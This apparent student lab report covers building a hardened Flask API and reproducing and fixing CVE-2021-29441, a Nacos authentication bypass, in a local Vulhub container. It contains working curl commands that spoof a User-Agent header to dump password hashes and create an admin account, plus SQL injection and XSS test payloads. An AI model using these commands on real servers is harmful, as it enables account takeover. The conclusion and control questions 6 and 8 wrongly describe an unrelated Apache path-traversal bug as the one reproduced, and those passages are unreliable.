# Lab 1 — Secure REST API Development with CI/CD and Real CVE Analysis

> **Work no.**: 1<br>
> **Title**: Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis<br>
> **Variant**: `<your variant number>`<br>
> **Name**: `<Surname Name>`<br>
> **HDU number**: `<student id>`<br>
> **Date**: 2026-10-19<br>
> **Repository**: `https://github.com/RyzLLL/-Information-Security-Lab1`<br>
> **Pipeline**: `https://github.com/RyzLLL/-Information-Security-Lab1/actions`

---

## 1. Purpose

1. Build a backend REST API from scratch with the protections the OWASP Top 10
   asks for.
2. Put SAST and SCA into CI/CD so every push and pull request is checked
   automatically.
3. Reproduce a real CVE in a controlled Vulhub environment and close the loop
   **reproduce → root cause → fix → verify**.
4. Present security conclusions in an engineering form: reproducible commands,
   comparable screenshots, verifiable fixes.

---

## 2. Environment

| Item | Version / notes |
|---|---|
| OS | Windows 11 (26100); CI runs on ubuntu-latest |
| Python | 3.12.4 |
| Framework | Flask 3.1.3 |
| Database | SQLite 3 (WAL) |
| Auth | PyJWT 2.15.0 (HS256) + bcrypt 4.3.0 (cost 12) |
| Tests | pytest 8.4.2, 84 cases |
| SAST | Bandit 1.7.9+ |
| SCA | pip-audit 2.7.3+ |
| Containers | Docker Desktop + Docker Compose v2 |
| Target range | Vulhub `nacos/CVE-2021-29441` |

---

## 3. Part 1 — the secure REST API

### 3.1 Stack and initialisation

**Python + Flask + SQLite**: few dependencies, small enough to be reviewed in
minutes; the best tooling support for `bandit` / `pip-audit`; SQLite removes
infrastructure work so the effort goes into the security code.

```bash
python -m venv .venv && .venv\Scripts\activate
pip install -r requirements-dev.txt
git init && git add . && git commit -m "feat: secure Flask API skeleton"
git remote add origin https://github.com/RyzLLL/-Information-Security-Lab1.git
git push -u origin main
```

```
app/
├── __init__.py     app factory, hardening headers
├── config.py       env-driven config; production refuses to boot without SECRET_KEY
├── db.py           schema + every parameterised query
├── security.py     bcrypt / JWT / validation / output escaping / rate limiter
├── errors.py       uniform JSON errors, no stack traces
├── auth.py         POST /auth/login
└── api.py          GET /api/data, POST /api/posts, GET /api/me
tests/              84 tests incl. SQLi / XSS regressions
cve/                vulnerable env, exploit, patch, verification
.github/workflows/ci.yml
```

### 3.2 API design

| # | Method | Path | Auth | Purpose |
|---|---|---|---|---|
| 1 | POST | `/auth/login` | — | Accepts `login` / `password`, returns a JWT |
| 2 | GET | `/api/data` | Bearer | Post feed (`limit`, `offset`, `q`) |
| 3 | POST | `/api/posts` | Bearer | **Own method**: create a post |
| + | GET | `/api/me` | Bearer | Identity carried by the token |
| + | GET | `/health` | — | Liveness |

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"Passw0rd!Alice"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 900,
  "user": {"id": 1, "username": "alice", "role": "admin"}
}
```

Without a token:

```http
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Bearer error="missing_token"

{"error": {"code": "unauthorized", "message": "Missing or malformed Authorization header (expected 'Bearer <token>')."}}
```

**Measured walkthrough** (`scripts/demo.ps1`, all PASS):

| Step | Request | Result |
|---|---|---|
| 1 | `GET /health` | 200 |
| 2 | `POST /auth/login` (alice) | 200, 900-second JWT |
| 3 | `GET /api/data` without token | **401** |
| 4 | `GET /api/data` with a forged token | **401** |
| 5 | `GET /api/data` with the real token | 200, returns the feed (`limit` honoured) |
| 6 | `POST /api/posts` | 201 |
| 7 | login with `alice' OR '1'='1` | **401** |
| 8 | search with `' OR 1=1 --` | 200, `total=0` (literal) |
| 9 | stored XSS `<script>alert('XSS')</script>` | 201, returned as `&lt;script&gt;…` |

> The full transcript (request bodies and complete responses, token redacted) is in [`docs/evidence/api-demo.txt`](evidence/api-demo.txt).


### 3.3 Security measures

#### 3.3.1 SQL injection — parameter binding everywhere

`app/db.py` is the only module that touches SQLite and every statement binds its
values:

```python
row = get_db().execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),          # the username is data, never SQL
).fetchone()
```

The search filter is bound as well, so `' OR 1=1 --` matches as a literal
substring:

```python
"WHERE p.title LIKE ? OR p.body LIKE ?", (f"%{search}%", f"%{search}%")
```

> The concatenation happens *inside a parameter value*, not inside the SQL
> syntax. The driver escapes it, so quotes cannot change the statement.

#### 3.3.2 XSS — encode on output, constrain on input

Data is stored raw and HTML-escaped on the way out
(`app/security.py::escape_value`, recursive over dicts/lists):

```python
"<script>alert('XSS')</script>"
  ->  "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
```

Three supporting controls: `application/json` plus
`X-Content-Type-Options: nosniff` (a browser will not parse it as HTML),
`Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`, and input
validation that rejects control characters and enforces length limits.

Validation also respects each field's line semantics: a **title** is single
line and rejects `\n`, `\r` and tabs, while a **body** may span lines but still
rejects every other control character — two distinct patterns
(`NO_CONTROL_OR_NEWLINE_RE` vs `CONTROL_CHARS_RE`). This came out of writing
the tests and then re-reading the code: both branches originally used the same
pattern, so `allow_newlines=False` did nothing and a title could still contain
a newline. The new test caught it.

#### 3.3.3 Authentication and sessions

| Requirement | Implementation |
|---|---|
| No plaintext passwords | bcrypt cost 12, per-password salt |
| bcrypt's 72-byte limit | rejected before hashing instead of silently truncated |
| Token issuance | HS256 JWT with `sub/iss/aud/iat/nbf/exp/jti`, 15-minute TTL |
| Verified on every protected endpoint | `@jwt_required` decorator |
| Algorithm pinning | `algorithms=["HS256"]` — blocks `alg:none` and RS→HS confusion |
| Claim validation | issuer, audience, required claims, expiry with 5 s leeway |
| Revocation | subject is re-read from the DB, so a deleted user's token dies |
| No user enumeration | identical status/body for unknown user and wrong password, with a dummy bcrypt check to flatten timing |
| Brute force | 5 failures per (IP, username) per 5 min → `429` + `Retry-After` |

```python
@wraps(view)
def wrapper(*args, **kwargs):
    claims = decode_access_token(bearer_token_from_request())   # signature + claims
    user = find_user_by_id(int(claims["sub"]))
    if user is None:
        raise AuthError("Account no longer exists.")
    g.current_user = user
    return view(*args, **kwargs)
```

#### 3.3.4 Further hardening

Uniform JSON error bodies (no stack trace / SQL / paths), `MAX_CONTENT_LENGTH`
64 KiB, `Cache-Control: no-store`, `X-Frame-Options: DENY`, the dev server binds
`127.0.0.1` only, and production refuses to start without `SECRET_KEY`.

### 3.4 Tests

```bash
pytest --cov=app --cov-report=term-missing
```

```
tests/test_auth.py        22 passed
tests/test_api.py         20 passed
tests/test_sqli_xss.py    24 passed
======================== 84 passed ========================
```

Coverage is **94%** (`pytest --cov=app`: 24 of 394 statements uncovered, mostly defensive branches such as over-long passwords, failed claim validation and rate-limit retries), and `ruff check` is clean.

| Test | Assertion |
|---|---|
| `test_sqli_in_login_never_authenticates[7 payloads]` | 401 and no `access_token` in the body |
| `test_sqli_in_search_is_treated_as_literal_text` | `total=0`, schema intact |
| `test_sqli_error_messages_are_not_leaked` | no `sqlite` / `syntax error` / `select ` in the response |
| `test_stored_xss_is_escaped_on_output` | raw `<script>` absent, `&lt;script&gt;` present |
| `test_reflected_xss_is_escaped[5 payloads]` | no `<script` / `<img` / `<svg` / `<iframe` |
| `test_other_methods_never_leak_the_feed[5 methods]` | unauthenticated HEAD/OPTIONS/PUT/DELETE/PATCH return no rows |
| `test_alg_none_token_is_rejected` | 401 |
| `test_token_signed_with_attacker_key_is_rejected` | 401 |
| `test_login_is_rate_limited` | 6th attempt returns 429 + `Retry-After` |

### 3.5 CI/CD with SAST and SCA

`.github/workflows/ci.yml`, on every push and pull request:

| Job | Tool | Purpose |
|---|---|---|
| `test` | pytest (3.11 / 3.12 matrix, coverage) | functional + security regressions |
| `lint` | `ruff check` (pinned) | imports, unused names, obvious bugs |
| `sast-bandit` | `bandit -r app -ll -ii` + SARIF upload | no medium/high static findings |
| `sca-pip-audit` | `pip-audit -r requirements.txt --strict` | no known vulnerable dependencies |

Both scanners also write their raw report into the **job summary**, so a
screenshot shows the tool output, not just a green check.

#### What the scanners actually found (re-run locally)

**SAST — Bandit**

```
$ bandit -r app -ll -ii
Test results:
	No issues identified.
Code scanned:
	Total lines of code: 636
	Total issues (by severity):
		Low: 3   Medium: 0   High: 0
```

`-ll -ii` reports medium severity/confidence and above, so the gate is green.
I reviewed all three low findings; each is a false positive caused by a config
key that happens to contain `PASSWORD`:

| Rule | Literal | Verdict |
|---|---|---|
| B105 | `PASSWORD_MAX_BYTES: 72` | bcrypt input limit, not a password |
| B105 | `PASSWORD_MIN_LENGTH: 8` | password policy, not a password |
| B106 | `"WWW-Authenticate": "Bearer …"` | HTTP auth scheme name, not a password |

**SCA — pip-audit, and this one found something real**

```
$ pip-audit -r requirements.txt --strict
Found 23 known vulnerabilities in 2 packages
  flask  3.1.2   PYSEC-2026-2151                    fix 3.1.3
  pyjwt  2.10.1  PYSEC-2026-120 / -175..-179 / -4140..-4183 …   fix 2.12.0 – 2.15.0
```

Several PyJWT entries are directly relevant here (unvalidated `crit` header,
algorithm-policy issues); the Flask one is a missing `Vary: Cookie`. The fix is
to raise the pins:

```diff
- flask==3.1.2
- PyJWT==2.10.1
+ flask==3.1.3
+ PyJWT==2.15.0
```

```
$ pip-audit -r requirements.txt --strict
No known vulnerabilities found
```

All 84 tests still pass after the upgrade. To rule out "the suite only went
green because the versions changed", the same suite was also run against the
old versions (Flask 3.1.2 / PyJWT 2.10.1) — green there too. The only thing
that changed is the audit result.

**Where to screenshot**: *Actions → CI → latest run*; the *SAST - Bandit* and
*SCA - pip-audit* job summaries; *Security → Code scanning*.

> ⬜ **Pending screenshots**: `docs/screenshots/ci-green.png`, `bandit.png`,
> `pip-audit.png` (take them after pushing to your own repository; drop the
> files into `docs/screenshots/` and rebuild the HTML to embed them).

![CI pipeline: four green jobs](screenshots/ci-green.png)

![Bandit (SAST) report](screenshots/bandit.png)

![pip-audit (SCA) report](screenshots/pip-audit.png)

### 3.6 Known limitations (scope statement)

Saying what this implementation deliberately does **not** do is more credible
than claiming it is "secure". The trade-offs:

| Limitation | Consequence | Production answer |
|---|---|---|
| The rate limiter is an in-process dict | With N workers each keeps its own counter, so the effective limit is N× higher (the table itself is capped at 5000 keys with LRU eviction, and a read never allocates, so it cannot be memory-bombed) | Redis counter, or rate limit at the gateway / WAF |
| Client identity comes from `X-Forwarded-For` | Behind no trusted proxy that header is spoofable, bypassing the limiter | Enable it only behind a trusted proxy, else use `remote_addr` |
| A JWT cannot be revoked before it expires | A stolen token works for up to 15 minutes (deleting the account does kill it) | Short TTL + refresh token + a `jti` denylist |
| XSS escaping happens in the API layer | A client that escapes again would double-encode; the correct place is the render layer | API guarantees JSON types only; escape at render time + strict CSP |
| No TLS | Lab-local; tokens and passwords travel in clear text | HTTPS + HSTS in production |
| SQLite has a single writer | Concurrent writes queue | PostgreSQL |
| Dependencies are pinned by version, not by hash | Supply-chain tampering is still possible | `pip install --require-hashes` + a lock file |
| Logs record only the username | No structured audit trail or alerting | JSON logs + central audit + alert rules |

None of these affect the lab objectives (3 endpoints, 4 controls, CI, the CVE
loop), but they are worth stating out loud in a viva.

---

## 4. Part 2 — CVE-2021-29441

### 4.1 Selection

**CVE-2021-29441 — Nacos < 1.4.1 authentication bypass.** CWE-290
(Authentication Bypass by Spoofing), CVSS 3.1 **8.6**. Chosen because:

* the root cause is a **single quotable shortcut** in `AuthFilter`, which trusts
  a request header to decide "this call comes from another Nacos server";
* the exploit is **two `curl` commands** with no payload crafting;
* the impact reaches the user-management API: read the bcrypt hashes *and*
  create an administrator;
* the fix has a real wrinkle — the vendor ships the new switch **enabled** (§4.4).

> The stock `vulhub/nacos:1.4.0` image runs with
> `nacos.core.auth.enabled=false`. With authentication off, *everything* is
> reachable and the header is irrelevant — that demo would not be about the CVE.
> Our image turns authentication **on**, which is exactly the precondition the
> advisory names.

```bash
cd cve
docker compose up -d --build        # 8848; the first build downloads the 1.4.0 tarball (~100 MB)
```

Nacos is a Spring Boot application: allow 30–60 s after `up`.

### 4.2 Reproduction

```bash
# 1) baseline: authentication is on, anonymous access is refused
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}

# 2) the bypass: same request, plus one header
curl -s -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}

# 3) impact: create an administrator with no credentials at all
curl -s -X POST -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
# -> 200  {"code":200,"message":"create user ok!","data":null}
```

**Measured** (full transcript in `cve/evidence/vulnerable.txt`):

```
1. Sanity check: GET /nacos/                              HTTP 200

2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}

3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
   {"totalCount":1,"pageNumber":1,"pageItems":[
      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.

4. Impact: create an admin account through the same bypass
   {"code":200,"message":"create user ok!","data":null}
   >>> VULNERABLE: 'pwned4779' was created without any credentials
```

The attacker then logs in at `http://127.0.0.1:8848/nacos/` with that account and
holds full administrative access.

![Vulnerable build: spoofed User-Agent leaks the user table and creates an admin](screenshots/cve-exploit.png)

### 4.3 Root cause

**Defect location**: `com.alibaba.nacos.core.auth.AuthFilter`.

With authentication enabled every request passes through that filter, which
short-circuits **server-to-server** traffic:

```java
// Nacos 1.4.0, simplified
if (userAgent.equals("Nacos-Server")) {
    return chain.doFilter(request, response);   // skip every auth check
}
```

The shortcut assumes "only a Nacos server sends this header". That assumption is
the bug: **a header is attacker-controlled data, not an identity** — anyone can
type the string. The failure is therefore not "a missing check" but a **trust
decision made on spoofable input**, the textbook shape of CWE-290. Worse, the
shortcut skipped *all* authorisation, including the user-management API, which
is why the impact is "any administrative task".

**Configuration matters.** The advisory says "when configured to use
authentication":

* with `nacos.core.auth.enabled=false` (the default, and what the stock Vulhub
  image ships) the bypass is invisible — the server is open anyway;
* so this is a **broken access-control design**, not "an insecure default".
  Turning auth on is what makes the bypass meaningful, and turning auth off is
  not a fix: it hides the symptom.

```
spoofed header ──► AuthFilter short-circuit ──► /v1/auth/users
                                             ├─ GET  → user table + bcrypt hashes
                                             └─ POST → create an administrator
```

The hashes are bcrypt (`$2a$10$`), so cracking is slow — but nothing needs to be
cracked: creating a **new** administrator is instant and quieter.

### 4.4 The fix

`Dockerfile.fixed` builds **Nacos 1.4.1**, the version that puts the hard-coded
shortcut behind a switch:

```
nacos.core.auth.enable.userAgentAuthWhite=true
```

**1.4.1 ships it enabled** for backwards compatibility, so a plain version bump
does **not** close the hole — we verified that a stock 1.4.1 still returns the
user table for the spoofed header. The real fix is two steps:

```diff
-  NACOS_VERSION=1.4.0
+  NACOS_VERSION=1.4.1
+  nacos.core.auth.enable.userAgentAuthWhite=false
```

and, because disabling the whitelist makes 1.4.1 demand a server identity for
internal calls, one more setting is needed or it rejects *everything*, console
included:

```
nacos.core.auth.server.identity.key=lab1server
nacos.core.auth.server.identity.value=lab1secret
```

With all three the same requests are refused:

```
HTTP 403
{"status":403,"error":"Forbidden","message":"Invalid server identity key or value,
 Please make sure set `nacos.core.auth.server.identity.key` and
 `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`"}
```

Lesson: **"fixed in version X" is not the same as "fixed".** Read the advisory
and the release notes, then verify the behaviour yourself.

### 4.5 Verification (with regression)

```bash
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
```

Measured:

```
1. Regression check: GET /nacos/
[PASS] console still returns 200

2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
[PASS] returns 403 instead of 200
[PASS] no user table in the body

3. Creating an account must fail
[PASS] no 'create user ok'

4. Authentication is still enabled
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
[PASS] anonymous access still refused

RESULT: fix verified -- all checks passed.
```

Check 4 matters as much as the rest: "the attack fails because authentication was
switched off" is a regression disguised as a fix, so the script asserts that
anonymous access is *still* refused.

![Fix verified: 403 for the spoofed header, console still 200](screenshots/cve-fixed.png)

### 4.6 Defence in depth

* Never authorise on a request header. If internal traffic must be recognised,
  use a **secret** (`server.identity.key/value`) or mTLS, scoped to the fewest
  possible paths.
* Keep the whitelist switch off; rotate the server identity when a node leaves.
* Put the console/API behind a network policy — Nacos is an internal component.
* Alert on `User-Agent: Nacos-Server` arriving from a non-cluster address.
* Treat the console as an administrative plane: separate credentials, 2FA at the
  proxy, audit-log shipping.


---

## 5. Conclusion

1. A working API and a secure API differ not in features but in **one decision
   at every trust boundary**: binding, encoding, signature verification, and
   error-message hygiene.
2. Security tests must be regressions: 24 of the 84 cases exist to attack the
   application, so breaking a control turns CI red immediately.
3. A CVE reproduction is valuable because it builds a **causal chain**: one
   `%2e`, one ordering bug, one `400` versus one `root:x:0:0`. Only with that
   chain can you write a patch and a detection rule.
4. A fix must be verified with **the same configuration and only the version
   changed**, plus a regression test — otherwise you cannot tell "fixed" from
   "switched off".

### Mapping to the grading rubric

| Criterion | Points | Where |
|---|---|---|
| API functionality | 2 | §3.2 (3 main + 2 auxiliary endpoints), demo all PASS |
| SQLi protection | 0.5 | §3.3.1 + 7 injection cases |
| XSS protection | 0.5 | §3.3.2 + 5 XSS payload cases |
| Authentication (JWT + hashing) | 1 | §3.3.3 + 19 auth cases |
| CI/CD with SAST/SCA | 2 | §3.5, Bandit + pip-audit + screenshots |
| Vulnerable env + CVE reproduction | 2 | §4.1–4.2 |
| Depth of root cause | 1 | §4.3 |
| Fix correctness and verification | 1 | §4.4–4.5 |

---

## 6. Control questions

**1. Why is bcrypt preferable to SHA-256 for password hashing?**
SHA-256 is designed to be fast; a modern GPU computes tens of billions of
hashes per second, so a leaked table falls quickly. bcrypt is designed to be
slow: a tunable cost factor (cost 12 = 4096 rounds), a per-password random salt
that defeats rainbow tables, and a Blowfish key schedule that costs memory as
well as time. The cost can be raised as hardware improves — SHA-256 has no such
knob.

**2. SAST versus DAST?**
SAST is white-box: it analyses source or bytecode without running the program,
finds data-flow problems early in the pipeline and points at a line, but produces
false positives and cannot see runtime configuration or third-party components.
DAST is black-box: it sends HTTP requests to a running system like an attacker,
finds genuinely exploitable runtime issues, but cannot name the code location and
cannot reach un-routed code. This lab uses SAST (Bandit + pip-audit) for code
and dependencies; DAST is the tool of Lab 2 (ZAP).

**3. How does a JWT work, what does it contain, how is it verified?**
Three base64url parts: `header.payload.signature`. The payload holds claims
(`sub`, `exp`, `iat`, `iss`, `aud`, roles). The payload is **encoded, not
encrypted** — anyone holding the token can read it, so it must not carry
secrets. The server recomputes the signature over `header.payload` with its key
(HMAC-SHA256 for HS256; sign-with-private/verify-with-public for RS256) and
checks `iss`, `aud`, `exp`, `nbf` and the presence of required claims. The
signature prevents forgery and `exp` limits the value of a stolen token. Pin the
algorithm allow-list, or `alg:none` and RS→HS confusion become possible.

**4. What risk comes from not auditing third-party dependencies?**
More than 80% of a modern application is third-party code, so an attacker does
not need to touch yours: one vulnerable transitive dependency (Log4Shell,
Struts2, this Nacos) is enough. Disclosure-to-exploitation windows are often
days. SCA provides a visible SBOM, alerts on known CVEs in CI, and turns "should
we upgrade?" into a process instead of memory.

**5. What do Docker and Vulhub offer over installing vulnerable software locally?**
Isolation and disposability — a compromise only reaches a container that can be
recreated from a file; exact, reproducible versions (no "it does not reproduce
because my box runs a patched version"); vulnerable and fixed builds side by side with only
a tag changed; configuration as code that a reviewer can inspect; and an
identical environment for every student, so grading is reproducible.

**6. Vulnerability versus exploit — which did you reproduce?**
A vulnerability is the flaw itself (the ordering bug in `ap_normalize_path()`);
an exploit is the concrete technique that weaponises it (the
`curl --path-as-is '.../.%2e/%2e%2e/...'` request). This lab reproduced the
vulnerability *by running a public exploit* against a deliberately vulnerable
build, then analysed the root cause, patched it, and proved the exploit no longer
works.

**7. Why is regression testing critical after a patch?**
Patches usually touch shared code paths (here, the authentication filter) and can
break legitimate requests: 1.4.1 is the case in point — it added the whitelist
switch but left it enabled, so the upgrade on its own did not stop the bypass,
and disabling it without a server identity locks out the console as well.
Regression testing answers two questions — was the fix *precise* (blocks the
malicious, keeps the legitimate) and did it *introduce* new problems
(availability, performance, compatibility). A fix without a regression test may
simply be a feature switched off.

**8. Why does CVE knowledge and reproduction matter for a pentester or a SOC analyst?**
For a pentester, reproduction is how impact is proven, and the KEV list is the
fastest triage of an estate. For a SOC analyst, knowing what the request looks
like (`/.%2e/`, double encoding, abnormal request targets) is what makes
detection rules and log review possible. More fundamentally, CVEs teach
**patterns** — canonicalisation order, deserialisation, injection, broken access
control — that reappear across languages and frameworks.

---

## 7. Submission checklist

| # | Requirement | Status / location |
|---|---|---|
| 1 | Public git repository link | `https://github.com/RyzLLL/-Information-Security-Lab1` (pushed) |
| 2 | README.md with project description, security measures, SAST/SCA screenshots, CVE, reproduction, root cause, fix, proof | `README.md` / `README.zh-CN.md` |
| 3 | Link to the last successful pipeline | `https://github.com/RyzLLL/-Information-Security-Lab1/actions` |
| 4 | Folder with the fixes | `cve/Dockerfile.fixed`, `cve/docker-compose.fixed.yml` |
| 5 | This report | `docs/report_en.md` (EN), `docs/report_zh.md` (ZH) |

### Still to do

- [ ] `docs/screenshots/ci-green.png`
- [ ] `docs/screenshots/bandit.png`
- [ ] `docs/screenshots/pip-audit.png`
- [ ] `docs/screenshots/cve-exploit.png`
- [ ] `docs/screenshots/cve-fixed.png`
- [ ] Fill in the title page (work no., title, variant, name, HDU number)
